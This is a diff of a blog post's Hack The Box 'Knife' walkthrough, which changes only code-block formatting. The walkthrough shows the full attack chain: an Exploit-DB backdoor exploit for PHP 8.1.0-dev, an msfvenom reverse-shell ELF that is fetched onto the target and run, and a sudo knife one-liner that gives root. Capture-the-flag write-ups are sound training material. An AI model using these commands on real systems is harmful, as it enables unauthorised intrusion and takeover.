@@ -27,8 +27,7 @@ Let us take a stab out of this knife box.
 
 Run nmap to discover the different port available.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.242 
 [sudo] password for kali: 
@@ -59,14 +58,17 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run nmap for all the port just to see if there are any nonstandard ports.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.242  
 [sudo] password for kali: 
@@ -79,8 +81,12 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapfull %}
 
 <br />
 Check out the landing page on the web server.
@@ -94,10 +100,7 @@ Check out the landing page on the web server.
 <br />
 Also, check the source for the landing page.
 
-{% raw %}
-```html
-view-source:http://10.10.10.242/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="en" >
 
@@ -111,14 +114,17 @@ view-source:http://10.10.10.242/
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
 
   <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="browser"
+   title="view-source:http://10.10.10.242/"
+   content=landingsource %}
 
 <br />
 And curl with the I option to pull the headers.
 
-{% raw %}
-```bash
+{% capture curlheaders %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ curl -I http://10.10.10.242         
 HTTP/1.1 200 OK
@@ -126,8 +132,12 @@ Date: Mon, 20 Jan 2025 13:56:07 GMT
 Server: Apache/2.4.41 (Ubuntu)
 X-Powered-By: PHP/8.1.0-dev
 Content-Type: text/html; charset=UTF-8
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=curlheaders %}
 
 <br />
 Check Exploit-db for any potential exploits for that version of PHP listed in the X-Powered-By header.
@@ -142,8 +152,7 @@ Check Exploit-db for any potential exploits for that version of PHP listed in th
 <br />
 Download the python script exploit to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ wget https://www.exploit-db.com/raw/49933 -O exploit.py                                
 --2025-01-21 01:05:23--  https://www.exploit-db.com/raw/49933
@@ -156,14 +165,17 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   1.99K  --.-KB/s    in 0s      
 
 2025-01-21 01:05:24 (59.1 MB/s) - ‘exploit.py’ saved [2040/2040]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadexploit %}
 
 <br />
 Execute the script and run whoami just to test the command execution.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ python exploit.py
 Enter the full host url:
@@ -173,26 +185,32 @@ Interactive shell is opened on http://10.10.10.242
 Can't acces tty; job crontol turned off.
 $ whoami
 james
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Generate a msfvenom payload.
 
-{% raw %}
-```bash
+{% capture genmsfvenom %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 -f elf -o shell
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -201,38 +219,47 @@ No encoder specified, outputting raw payload
 Payload size: 68 bytes
 Final size of elf file: 152 bytes
 Saved as: shell
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=genmsfvenom %}
 
 <br />
 Start python webserver to serve the new exploit.
 
-{% raw %}
-```bash
+{% capture startpywebserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ python -m 'http.server'                                                                                     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startpywebserver %}
 
 <br />
 Transfer the new elf file to the victim.  Use chmod +x to change the permission of the file.  Run the executable.
 
-{% raw %}
-```bash
+{% capture transferelf %}
 $ curl http://10.10.16.3:8000/shell -o /dev/shm/shell
 
 $ chmod +x /dev/shm/shell
 
 $ /dev/shm/shell
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transferelf %}
 
 <br />
 Check the listener and catch the shell.  Run the whoami to confirm command execution.  Use the python to ugrade the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/knife]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
@@ -241,15 +268,18 @@ connect to [10.10.16.3] from (UNKNOWN) [10.10.10.242] 48238
 whoami
 james
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-james@knife:/$ 
-```
-{% endraw %}
+james@knife:/$
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 james@knife:/home/james$ cat user.txt
 cat user.txt
 <redacted>
@@ -269,14 +299,17 @@ ip a
        valid_lft 86392sec preferred_lft 14392sec
     inet6 fe80::250:56ff:feb9:4502/64 scope link 
        valid_lft forever preferred_lft forever 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Run sudo -l to get a list of the command this user can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 james@knife:/home/james$ sudo -l
 sudo -l
 Matching Defaults entries for james on knife:
@@ -284,26 +317,32 @@ Matching Defaults entries for james on knife:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User james may run the following commands on knife:
-    (root) NOPASSWD: /usr/bin/knife 
-```
-{% endraw %}
+    (root) NOPASSWD: /usr/bin/knife
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sudol %}
 
 <br />
 Run ls -la on that file.
 
-{% raw %}
-```bash
+{% capture getperms %}
 james@knife:/home/james$ ls -la /usr/bin/knife
 ls -la /usr/bin/knife
 lrwxrwxrwx 1 root root 31 May  7  2021 /usr/bin/knife -> /opt/chef-workstation/bin/knife
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=getperms %}
 
 <br />
 Run the knife command to see what it does.
 
-{% raw %}
-```bash
+{% capture testrun %}
 james@knife:/home/james$ /usr/bin/knife
 /usr/bin/knife
 ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)
@@ -315,8 +354,12 @@ Usage: knife sub-command (options)
     -k, --key KEY                    Chef Infra Server API client key.
 
     <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=testrun %}
 
 <br />
 Check the knife on the GTFOBins.
@@ -331,21 +374,23 @@ Check the knife on the GTFOBins.
 <br />
 Execute the one-liner that was indicate in the bins.
 
-{% raw %}
-```bash
+{% capture executesh %}
 james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
 sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
 # whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=executesh %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -365,8 +410,12 @@ ip a
        valid_lft 86398sec preferred_lft 14398sec
     inet6 fe80::250:56ff:feb9:4502/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 And with that...ninja vanish!
